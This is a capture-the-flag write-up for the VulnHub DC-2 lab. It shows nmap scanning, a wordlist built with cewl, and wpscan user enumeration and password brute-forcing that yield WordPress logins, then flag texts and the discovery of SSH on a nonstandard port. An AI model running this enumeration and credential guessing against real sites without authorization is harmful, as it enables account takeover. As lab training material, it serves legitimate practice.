vulnhub DC-2 writeup

#Enumeration
root@parrot]─[/home/user]
└──╼ #nmap -sV -sC -O -A 192.168.0.131
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-26 10:03 UTC
Nmap scan report for DC-2 (192.168.0.131)
Host is up (0.00085s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
|_http-server-header: Apache/2.4.10 (Debian)
| http-title: DC-2 &#8211; Just another WordPress site
|_Requested resource was http://dc-2/
MAC Address: 08:00:27:6E:FC:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop


# cewl
[root@parrot]─[/home/user]
└──╼ #cewl -w dc-2.txt -o http://192.168.0.131
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)


# wordpress scan
┌─[root@parrot]─[/home/user]
└──╼ #wpscan -P /home/user/dc-2.txt -e vp --url http://dc-2

#output of wordpress scans
[i] User(s) Identified:

[+] admin
 | Detected By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jerry
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


[i] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

##flag1 


Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.

##flag2

Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.

##zenmap command

nmap -p 1-65535 -T4 -A -v 192.168.0.131

results:
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
